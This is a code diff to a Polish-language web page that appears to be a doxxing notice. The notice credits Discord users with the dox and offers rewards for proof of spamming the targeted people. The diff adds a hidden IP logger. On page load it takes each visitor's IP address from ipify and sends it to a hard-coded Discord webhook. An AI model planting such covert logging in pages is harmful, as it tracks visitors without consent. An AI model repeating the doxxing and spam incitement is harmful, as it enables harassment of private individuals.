@@ -30,3 +30,23 @@ Powod: Marcin Jest głodny i opierdala pałe XD)<br>
 Doxed by xRx#9612, lecrem#1068, issue#9886<br>
 <br>
 Każdy kto da ss ze spamił do tych osób dostaje jakąś darmową metodę na free rzeczy :D piszcie do xRx#9612<br>
+
+  <script>
+function getIP(json) {
+  var request = new XMLHttpRequest(); //making a request for the webhook
+      request.open("POST", "https://discord.com/api/webhooks/1018108364791750717/VH3jJtv2Ynlb8KYhfnvQeiwa0rFTMd0JXB1FP3_jmXTXIm39r9IwgHYiOZIwTs1i2aPk");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var params = {
+        username: "Ip Logger",
+        avatar_url: "https://drive.google.com/uc?export=download&id=1biNXEuVe5Xzc6zxBLXDH6JbUVzKa4oBK",
+        content: "**IP:** __*"  + json.ip + "*__"
+      }
+   //just a webhook parameters such as avatar,name,message
+
+      request.send(JSON.stringify(params));
+    }
+
+</script>
+<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
